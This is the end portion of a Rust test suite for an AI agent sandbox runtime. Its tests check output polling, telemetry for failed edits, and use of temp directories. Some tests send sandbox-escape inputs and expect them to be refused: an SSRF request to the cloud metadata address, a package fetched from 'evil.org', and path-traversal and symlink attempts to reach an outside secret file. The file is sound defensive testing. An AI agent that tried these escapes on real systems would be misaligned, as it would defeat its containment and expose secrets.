        assert_eq!(tail_poll["stderr_offset_returned"], 30);

        // Offset mode slices `[offset .. min(len, offset + tail_bytes)]`.
        let mid_poll = kernel
            .call_tool(
                &agent,
                "proc_exec",
                json!({
                    "poll_pid": pid,
                    "stdout_offset": 90,
                    "stderr_offset": 20,
                    "tail_bytes": 40
                }),
            )
            .await
            .unwrap();
        let mid_out = mid_poll["stdout"].as_str().unwrap();
        assert_eq!(mid_out.len(), 40);
        assert_eq!(mid_out.as_bytes()[9], b'1');
        assert_eq!(mid_poll["stdout_total_bytes"], 200);
        assert_eq!(mid_poll["stdout_truncated"], true);
        assert_eq!(mid_poll["stdout_offset_returned"], 90);
        assert_eq!(mid_poll["stderr"].as_str().unwrap().len(), 40);
        assert_eq!(mid_poll["stderr_total_bytes"], 80);
        assert_eq!(mid_poll["stderr_truncated"], true);
        assert_eq!(mid_poll["stderr_offset_returned"], 20);

        // Final offset chunk reaching EOF sets `*_truncated` to false.
        let end_poll = kernel
            .call_tool(
                &agent,
                "proc_exec",
                json!({
                    "poll_pid": pid,
                    "stdout_offset": 170,
                    "stderr_offset": 50,
                    "tail_bytes": 40
                }),
            )
            .await
            .unwrap();
        assert_eq!(end_poll["stdout"].as_str().unwrap().len(), 30);
        assert!(end_poll["stdout"].as_str().unwrap().ends_with('2'));
        assert_eq!(end_poll["stdout_truncated"], false);
        assert_eq!(end_poll["stdout_offset_returned"], 170);
        assert_eq!(end_poll["stderr"].as_str().unwrap().len(), 30);
        assert!(end_poll["stderr"].as_str().unwrap().ends_with('7'));
        assert_eq!(end_poll["stderr_truncated"], false);
        assert_eq!(end_poll["stderr_offset_returned"], 50);
    }

    #[tokio::test]
    async fn fs_edit_and_boundary_denials_emit_zero_pii_friction_events_and_reset_streaks() {
        let tmp = tempfile::tempdir().unwrap();
        let rt_dir = tmp.path().join("rt");
        let host_proj = tmp.path().join("host_proj");
        tokio::fs::create_dir_all(&host_proj).await.unwrap();
        tokio::fs::write(
            host_proj.join("secret_file.rs"),
            "pub fn target_ok() -> u32 { 1 }\n",
        )
        .await
        .unwrap();

        let kernel = AegisRuntimeKernel::new(&rt_dir).await.unwrap();
        let agent = AgentIdentity::new("acme", "coder-probes", "Engineer");
        kernel
            .ensure_agent_environment(
                agent.clone(),
                &host_proj,
                IsolationTier::NativeOsSandbox,
                vec!["*".to_string()],
            )
            .await
            .unwrap();

        let streak_key = (agent.agent_id.clone(), "fs_edit".to_string());

        // 1. Three consecutive fs_edit failures increment streak and trigger LoopThrash at >= 3.
        for expected_streak in 1..=3u32 {
            let err = kernel
                .call_tool(
                    &agent,
                    "fs_edit",
                    json!({
                        "path": "secret_file.rs",
                        "target": "NEVER_MATCH_SECRET_SNIPPET",
                        "replacement": "pub fn x() {}"
                    }),
                )
                .await
                .unwrap_err()
                .to_string();
            assert_eq!(
                kernel.friction_streaks.read().await.get(&streak_key).copied(),
                Some(expected_streak)
            );
            if expected_streak < 3 {
                assert!(!err.contains("[aegis_hint (loop_thrash)]"), "{err}");
            } else {
                assert!(err.contains("[aegis_hint (loop_thrash)]"), "{err}");
            }
        }

        // 2. Successful fs_edit resets the streak cleanly.
        let edit_ok = kernel
            .call_tool(
                &agent,
                "fs_edit",
                json!({
                    "path": "secret_file.rs",
                    "target": "pub fn target_ok() -> u32 { 1 }",
                    "replacement": "pub fn target_ok() -> u32 { 2 }"
                }),
            )
            .await
            .unwrap();
        assert_eq!(edit_ok["status"], "edited_in_cow_shadow");
        assert!(
            kernel.friction_streaks.read().await.get(&streak_key).is_none(),
            "fs_edit success must reset streak"
        );

        // 3. Failure after success restarts streak at 1 without immediate LoopThrash.
        let post_reset_err = kernel
            .call_tool(
                &agent,
                "fs_edit",
                json!({
                    "path": "secret_file.rs",
                    "target": "MISSING_AFTER_RESET",
                    "replacement": "noop"
                }),
            )
            .await
            .unwrap_err()
            .to_string();
        assert_eq!(
            kernel.friction_streaks.read().await.get(&streak_key).copied(),
            Some(1)
        );
        assert!(
            !post_reset_err.contains("[aegis_hint (loop_thrash)]"),
            "{post_reset_err}"
        );

        // 4. Egress policy denial (loopback/link-local unlisted target) and SSRF URL rejection emit EgressDenied.
        assert!(kernel
            .call_tool(
                &agent,
                "egress_http_request",
                json!({
                    "target_domain": "127.0.0.1",
                    "method": "GET",
                    "path": "/private-token-leak"
                }),
            )
            .await
            .is_err());
        assert!(kernel
            .call_tool(
                &agent,
                "egress_http_request",
                json!({
                    "url": "http://169.254.169.254/latest/meta-data",
                    "method": "GET"
                }),
            )
            .await
            .is_err());

        // 5. pkg_install validation failure & host_exec broker rejection emit their respective categories.
        assert!(kernel
            .call_tool(
                &agent,
                "pkg_install",
                json!({ "manager": "npm", "packages": ["https://evil.org/pkg.tgz"], "offline": true }),
            )
            .await
            .is_err());
        assert!(kernel
            .call_tool(
                &agent,
                "host_exec",
                json!({ "program": "python3", "script": "scripts/probe.py" }),
            )
            .await
            .is_err());

        if !aos_core::friction::is_telemetry_opted_out() {
            let log_txt = std::fs::read_to_string(kernel.friction_log_path()).unwrap();
            assert!(!log_txt.contains("secret_file.rs"));
            assert!(!log_txt.contains("NEVER_MATCH_SECRET_SNIPPET"));
            assert!(!log_txt.contains("MISSING_AFTER_RESET"));
            assert!(!log_txt.contains("169.254.169.254"));
            assert!(!log_txt.contains("private-token-leak"));
            assert!(!log_txt.contains("evil.org"));

            let events =
                aos_core::friction::load_friction_events(&kernel.friction_log_path(), None)
                    .unwrap();
            let edit_mismatches: Vec<_> = events
                .iter()
                .filter(|e| {
                    e.category == aos_core::friction::FrictionCategory::EditMismatch
                        && e.cmd_bucket == aos_core::friction::CmdBucket::FsEdit
                })
                .collect();
            assert_eq!(edit_mismatches.len(), 4);
            assert_eq!(
                edit_mismatches
                    .iter()
                    .map(|e| e.streak_len)
                    .collect::<Vec<_>>(),
                vec![1, 2, 3, 1]
            );
            assert!(events.iter().any(|e| {
                e.category == aos_core::friction::FrictionCategory::LoopThrash
                    && e.cmd_bucket == aos_core::friction::CmdBucket::FsEdit
                    && e.streak_len == 3
                    && !e.recovered
            }));
            assert!(events.iter().any(|e| {
                e.category == aos_core::friction::FrictionCategory::LoopThrash
                    && e.cmd_bucket == aos_core::friction::CmdBucket::FsEdit
                    && e.streak_len == 3
                    && e.recovered
            }));
            assert_eq!(
                events
                    .iter()
                    .filter(|e| {
                        e.category == aos_core::friction::FrictionCategory::EgressDenied
                            && e.cmd_bucket == aos_core::friction::CmdBucket::Egress
                    })
                    .count(),
                2
            );
            assert!(events.iter().any(|e| {
                e.category == aos_core::friction::FrictionCategory::PkgInstallFailed
                    && e.cmd_bucket == aos_core::friction::CmdBucket::PkgInstall
            }));
            assert!(events.iter().any(|e| {
                e.category == aos_core::friction::FrictionCategory::HostExecDenied
                    && e.cmd_bucket == aos_core::friction::CmdBucket::HostExec
            }));
        }
    }

    #[tokio::test]
    async fn fs_tools_support_tmpdir_scratch_without_polluting_shadow_diff() {
        let tmp = tempfile::tempdir().unwrap();
        let rt_dir = tmp.path().join("rt");
        let host_proj = tmp.path().join("host_proj");
        tokio::fs::create_dir_all(&host_proj).await.unwrap();
        tokio::fs::write(host_proj.join("README.md"), "# Seed\n")
            .await
            .unwrap();

        let kernel = AegisRuntimeKernel::new(&rt_dir).await.unwrap();
        let agent = AgentIdentity::new("org-tmp", "coder-tmp", "Engineer");
        kernel
            .ensure_agent_environment(
                agent.clone(),
                &host_proj,
                IsolationTier::NativeOsSandbox,
                vec!["*".to_string()],
            )
            .await
            .unwrap();

        // 1. workspace_status exposes writable tmp_dir.
        let status = kernel
            .call_tool(&agent, "workspace_status", json!({}))
            .await
            .unwrap();
        let tmp_dir = PathBuf::from(status["tmp_dir"].as_str().unwrap());
        assert!(tmp_dir.ends_with("tmp"));
        assert!(tmp_dir.is_dir());

        // 2. fs_write writes into nested $TMPDIR dir without polluting CoW shadow diff.
        let write_res = kernel
            .call_tool(
                &agent,
                "fs_write",
                json!({
                    "path": "$TMPDIR/scratch/note.txt",
                    "content": "hello tmp\n"
                }),
            )
            .await
            .unwrap();
        assert_eq!(write_res["status"], "written_to_agent_tmp");
        assert_eq!(write_res["path"], "$TMPDIR/scratch/note.txt");
        assert!(tmp_dir.join("scratch/note.txt").is_file());

        let status_after_write = kernel
            .call_tool(&agent, "workspace_status", json!({}))
            .await
            .unwrap();
        assert_eq!(status_after_write["uncommitted_changes_count"], 0);

        // 3. fs_read works via both "$TMPDIR/..." and the resolved absolute tmp_dir path.
        let read_rel = kernel
            .call_tool(&agent, "fs_read", json!({ "path": "$TMPDIR/scratch/note.txt" }))
            .await
            .unwrap();
        assert_eq!(read_rel["workspace_mode"], "agent_tmp");
        assert_eq!(read_rel["content"], "hello tmp\n");

        let read_abs = kernel
            .call_tool(
                &agent,
                "fs_read",
                json!({ "path": tmp_dir.join("scratch/note.txt") }),
            )
            .await
            .unwrap();
        assert_eq!(read_abs["workspace_mode"], "agent_tmp");
        assert_eq!(read_abs["content"], "hello tmp\n");

        // 4. fs_edit modifies $TMPDIR file in place.
        let edit_res = kernel
            .call_tool(
                &agent,
                "fs_edit",
                json!({
                    "path": "$TMPDIR/scratch/note.txt",
                    "target": "hello tmp",
                    "replacement": "updated tmp"
                }),
            )
            .await
            .unwrap();
        assert_eq!(edit_res["status"], "edited_in_agent_tmp");
        let after_edit = std::fs::read_to_string(tmp_dir.join("scratch/note.txt")).unwrap();
        assert_eq!(after_edit, "updated tmp\n");

        // 5. fs_glob lists scratch files under "$TMPDIR/...".
        let glob_res = kernel
            .call_tool(&agent, "fs_glob", json!({ "pattern": "$TMPDIR/scratch" }))
            .await
            .unwrap();
        assert_eq!(glob_res["files_count"], 1);
        assert_eq!(glob_res["files"][0], "$TMPDIR/scratch/note.txt");

        // 6. fs_delete removes the $TMPDIR file.
        let del_res = kernel
            .call_tool(&agent, "fs_delete", json!({ "path": "$TMPDIR/scratch/note.txt" }))
            .await
            .unwrap();
        assert_eq!(del_res["status"], "deleted_in_agent_tmp");
        assert!(!tmp_dir.join("scratch/note.txt").exists());

        // 7. Traversal and symlink escapes out of $TMPDIR are strictly refused.
        assert!(kernel
            .call_tool(
                &agent,
                "fs_write",
                json!({ "path": "$TMPDIR/../escape.txt", "content": "x" }),
            )
            .await
            .is_err());
        assert!(kernel
            .call_tool(&agent, "fs_read", json!({ "path": "$TMPDIR/../escape.txt" }))
            .await
            .is_err());

        #[cfg(unix)]
        {
            let outside_dir = tempfile::tempdir().unwrap();
            let outside_file = outside_dir.path().join("secret.txt");
            std::fs::write(&outside_file, "SECRET").unwrap();
            let link_path = tmp_dir.join("sym_leak.txt");
            std::os::unix::fs::symlink(&outside_file, &link_path).unwrap();
            assert!(kernel
                .call_tool(
                    &agent,
                    "fs_write",
                    json!({ "path": "$TMPDIR/sym_leak.txt", "content": "pwnd" }),
                )
                .await
                .is_err());
            assert!(kernel
                .call_tool(&agent, "fs_read", json!({ "path": "$TMPDIR/sym_leak.txt" }))
                .await
                .is_err());
            assert_eq!(std::fs::read_to_string(&outside_file).unwrap(), "SECRET");
        }
    }
}
